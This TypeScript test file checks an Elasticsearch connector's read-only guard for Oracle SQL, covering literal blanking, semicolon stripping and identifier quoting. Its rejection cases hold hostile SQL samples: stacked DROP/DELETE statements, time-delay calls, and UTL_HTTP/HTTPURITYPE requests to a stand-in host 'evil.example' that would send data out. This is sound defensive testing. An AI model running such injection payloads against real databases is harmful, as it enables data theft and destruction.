/*
 * Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
 * or more contributor license agreements. Licensed under the "Elastic License
 * 2.0", the "GNU Affero General Public License v3.0 only", and the "Server Side
 * Public License v 1"; you may not use this file except in compliance with, at
 * your election, the "Elastic License 2.0", the "GNU Affero General Public
 * License v3.0 only", or the "Server Side Public License, v 1".
 */

import { assertReadOnly, SELECT_OR_WITH_PREFIX } from './generic_db_connector';
import {
  blankNonCode,
  escapeSearchTerm,
  ORACLE_READ_GUARD_PATTERN,
  quoteIdentifier,
  stripTrailingSemicolon,
} from './oracle_sql';

const guard = (sql: string): void =>
  assertReadOnly(blankNonCode(sql), SELECT_OR_WITH_PREFIX, ORACLE_READ_GUARD_PATTERN);

describe('blankNonCode', () => {
  it('keeps the length so indexes line up with the original SQL', () => {
    const sql = `SELECT 'a;b' /* c */ FROM dual -- tail`;
    expect(blankNonCode(sql)).toHaveLength(sql.length);
  });

  it('blanks string literals, including doubled quotes', () => {
    expect(blankNonCode(`SELECT 'it''s DROP TABLE' FROM dual`)).not.toMatch(/DROP|it/);
  });

  it('blanks line and block comments (block comments do not nest)', () => {
    expect(blankNonCode('SELECT 1 -- DROP\nFROM dual')).not.toMatch(/DROP/);
    expect(blankNonCode('SELECT 1 /* DROP /* x */ FROM dual')).toMatch(/FROM dual/);
  });

  it.each([
    [`q'[DROP TABLE]'`],
    [`q'[DROP 'x' TABLE]'`],
    [`q'(DROP TABLE)'`],
    [`q'{DROP TABLE}'`],
    [`q'<DROP TABLE>'`],
    [`q'!DROP TABLE!'`],
    [`nq'[DROP TABLE]'`],
    [`Q'#DROP TABLE#'`],
  ])('blanks the alternative-quoting literal %s', (literal) => {
    expect(blankNonCode(`SELECT ${literal} FROM dual`)).toMatch(/^SELECT\s+(?:n?q)?\s*FROM dual$/i);
  });

  it('does not treat an identifier ending in q as alternative quoting', () => {
    // `seq'x'` is the identifier seq followed by an ordinary literal.
    expect(blankNonCode(`SELECT seq'x' FROM dual`)).toMatch(/seq\s+FROM dual/);
  });

  it('blanks a semicolon inside a double-quoted identifier so it is not a statement terminator', () => {
    expect(blankNonCode('SELECT * FROM "a;b"')).not.toContain(';');
    expect(() => guard('SELECT * FROM "a;b"')).not.toThrow();
    const sql = 'SELECT * FROM "t;"';
    expect(stripTrailingSemicolon(sql, blankNonCode(sql))).toBe(sql);
  });

  it('keeps the text of double-quoted identifiers so quoted package calls stay visible', () => {
    expect(blankNonCode('SELECT SYS."DBMS_LOCK".SLEEP(1) FROM dual')).toMatch(/DBMS_LOCK/);
  });
});

describe('stripTrailingSemicolon', () => {
  const strip = (sql: string) => stripTrailingSemicolon(sql, blankNonCode(sql));

  it('removes a single trailing semicolon', () => {
    expect(strip('SELECT 1 FROM dual;')).toBe('SELECT 1 FROM dual');
    expect(strip('SELECT 1 FROM dual ;  \n')).toBe('SELECT 1 FROM dual   \n');
  });

  it('removes a semicolon followed only by a comment', () => {
    expect(strip('SELECT 1 FROM dual; -- note')).toBe('SELECT 1 FROM dual -- note');
  });

  it('leaves a semicolon inside a literal alone', () => {
    expect(strip(`SELECT 'a;' FROM dual`)).toBe(`SELECT 'a;' FROM dual`);
  });

  it('leaves SQL without a semicolon alone', () => {
    expect(strip('SELECT 1 FROM dual')).toBe('SELECT 1 FROM dual');
  });
});

describe('read guard', () => {
  it.each([
    ['SELECT * FROM hr.employees FETCH FIRST 10 ROWS ONLY'],
    ['WITH t AS (SELECT 1 AS n FROM dual) SELECT n FROM t'],
    [`SELECT 'DROP TABLE x; DBMS_LOCK.SLEEP(1)' AS note FROM dual`],
    ['SELECT 1 FROM dual -- UTL_HTTP.REQUEST'],
    ['SELECT /*+ FULL(e) */ * FROM hr.employees e'],
    ['SELECT "UPDATED_AT" FROM hr.employees'],
    ['SELECT 1 FROM dual;'],
    [`SELECT q'[x'; DROP TABLE t; --]' FROM dual`],
  ])('allows %s', (sql) => {
    expect(() => guard(sql)).not.toThrow();
  });

  it.each([
    ['INSERT INTO t VALUES (1)'],
    ['DELETE FROM t'],
    ['SELECT 1 FROM dual; DROP TABLE t'],
    ['DROP/**/TABLE t'],
    ['BEGIN NULL; END;'],
    ['SELECT * FROM hr.employees FOR UPDATE'],
    ['SELECT * FROM hr.employees FOR  UPDATE NOWAIT'],
    ['WITH FUNCTION f RETURN NUMBER IS BEGIN RETURN 1; END; SELECT f FROM dual'],
    ["SELECT UTL_HTTP.REQUEST('http://evil.example') FROM dual"],
    ['SELECT SYS.UTL_INADDR.GET_HOST_ADDRESS(1) FROM dual'],
    ['SELECT SYS."DBMS_LOCK".SLEEP(10) FROM dual'],
    ['SELECT dbms_pipe.receive_message(1) FROM dual'],
    ["SELECT HTTPURITYPE('http://evil.example').getclob() FROM dual"],
    ["SELECT SYS.URIFACTORY.getURI('http://evil.example').getClob() FROM DUAL"],
    ['SELECT sys."URIFACTORY".getURI(x) FROM t'],
    ['SELECT * FROM remote_table@other_db'],
    ['SELECT * INTO x FROM dual; SELECT 1 FROM dual'],
  ])('rejects %s', (sql) => {
    expect(() => guard(sql)).toThrow();
  });

  it('rejects a comment-obfuscated write token', () => {
    expect(() => guard('SELECT 1 FROM dual; /* x */ DELETE FROM t')).toThrow();
  });
});

describe('quoteIdentifier', () => {
  it('quotes with double quotes and doubles embedded quotes', () => {
    expect(quoteIdentifier('EMPLOYEES')).toBe('"EMPLOYEES"');
    expect(quoteIdentifier('we"ird')).toBe('"we""ird"');
  });
});

describe('escapeSearchTerm', () => {
  it('lower-cases and escapes LIKE wildcards and the escape character', () => {
    expect(escapeSearchTerm('100%_Done!')).toBe('100!%!_done!!');
  });
});
